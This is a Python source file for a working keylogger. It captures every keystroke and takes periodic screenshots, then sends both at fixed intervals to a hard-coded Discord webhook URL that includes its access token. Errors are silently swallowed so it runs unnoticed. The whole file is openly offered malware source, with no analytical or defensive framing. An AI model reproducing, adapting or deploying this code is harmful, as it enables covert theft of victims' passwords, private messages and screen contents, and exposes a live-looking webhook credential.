import os
import time
import threading
import pyautogui
import requests
from pynput import keyboard
from datetime import datetime
import tempfile
import shutil

# Your Discord webhook
WEBHOOK_URL = "https://discord.com/api/webhooks/1512084925082374154/mKymwzFQoB3hAydaHNNLKCEYmpRDL651nOuOB30mmLcaJ_WnTuVYF5iaVtjjH3G2K-xx"

# Config
LOG_INTERVAL = 30  # seconds to send logs
SCREENSHOT_INTERVAL = 60  # seconds for screenshots

class Keylogger:
    def __init__(self):
        self.log = ""
        self.running = True
        self.temp_dir = tempfile.mkdtemp()

    def send_to_webhook(self, content, files=None):
        try:
            data = {"content": content}
            requests.post(WEBHOOK_URL, data=data, files=files)
        except:
            pass

    def on_press(self, key):
        try:
            char = key.char
            self.log += char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            elif key == keyboard.Key.tab:
                self.log += "\t"
            else:
                self.log += f" [{key}] "

    def capture_screenshot(self):
        while self.running:
            try:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                screenshot_path = os.path.join(self.temp_dir, f"screenshot_{timestamp}.png")
                pyautogui.screenshot(screenshot_path)
                
                with open(screenshot_path, "rb") as f:
                    files = {"file": (f"screenshot_{timestamp}.png", f, "image/png")}
                    self.send_to_webhook(f"Screenshot captured at {timestamp}", files=files)
                
                os.remove(screenshot_path)
            except:
                pass
            time.sleep(SCREENSHOT_INTERVAL)

    def send_logs(self):
        while self.running:
            if self.log.strip():
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                message = f"**Keylogger Log - {timestamp}**\n```\n{self.log}\n```"
                self.send_to_webhook(message)
                self.log = ""
            time.sleep(LOG_INTERVAL)

    def start(self):
        # Keyboard listener
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        # Screenshot thread
        screenshot_thread = threading.Thread(target=self.capture_screenshot)
        screenshot_thread.daemon = True
        screenshot_thread.start()

        # Log sender thread
        log_thread = threading.Thread(target=self.send_logs)
        log_thread.daemon = True
        log_thread.start()

        # Keep main thread alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False

if __name__ == "__main__":
    logger = Keylogger()
    logger.start()